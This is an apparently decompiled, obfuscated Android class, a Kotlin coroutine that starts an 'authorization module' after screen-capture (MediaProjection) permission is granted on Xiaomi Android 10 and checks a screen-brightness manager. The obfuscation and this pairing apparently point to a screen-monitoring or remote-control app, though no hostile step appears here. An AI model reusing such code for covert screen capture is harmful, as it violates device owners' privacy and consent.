package com.storm.safe.rock.service;

import com.storm.safe.rock.service.modules.C0329b4;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.ju0;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$handleMediaProjectionGranted$2", m214403f = "dqtvuisjd.kt", m214404l = {7185}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$handleMediaProjectionGranted$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52551a1;

    /* renamed from: a2 */
    public final /* synthetic */ dqtvuisjd f52552a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$handleMediaProjectionGranted$2(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52552a2 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$handleMediaProjectionGranted$2(this.f52552a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$handleMediaProjectionGranted$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0329b4 c0329b4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52551a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            this.f52551a1 = 1;
            if (b81.m210571b1(100L, this) == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
        }
        t60.m214714d6("dqtvuisjd", "🔧 小米Android 10 MediaProjection权限成功，开始启动授权模块");
        dqtvuisjd dqtvuisjdVar = this.f52552a2;
        ju0 ju0Var = dqtvuisjdVar.f52433g4;
        if (ju0Var == null) {
            t60.m214724f2("screenBrightnessManager");
            throw null;
        }
        if (!ju0Var.m213351a1() && (c0329b4 = dqtvuisjdVar.f52431g2) != null) {
            c0329b4.m211768a6();
        }
        return C1351vv.f60710b1;
    }
}
